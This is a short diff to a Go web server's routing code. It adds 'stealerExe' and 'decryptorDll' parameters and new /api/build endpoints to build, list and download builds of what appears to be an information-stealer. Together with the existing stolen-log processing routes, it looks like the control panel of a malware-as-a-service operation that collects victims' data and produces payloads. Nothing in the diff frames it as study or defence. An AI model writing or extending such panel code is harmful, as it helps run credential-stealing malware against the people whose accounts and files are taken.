@@ -67,7 +67,7 @@ func CORSMiddleware(allowedOrigins string) func(http.Handler) http.Handler {
 	}
 }
 
-func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins string, hub *ws.Hub) {
+func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins string, hub *ws.Hub, stealerExe, decryptorDll []byte) {
 	authHandler := NewAuthHandler(db, jwtSecret)
 	statsHandler := NewStatsHandler(db, hub)
 	logProc := services.NewLogProcessor(db, hub)
@@ -97,5 +97,12 @@ func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, allowedOrigins stri
 
 		sspHandler := NewSSPHandler(logProc)
 		r.Post("/api/log/ssp", sspHandler.ProcessSSP)
+
+		r.Route("/api/build", func(r chi.Router) {
+			buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, db)
+			r.Post("/", buildHandler.Build)
+			r.Get("/", buildHandler.List)
+			r.Get("/{id}/download", buildHandler.Download)
+		})
 	})
 }
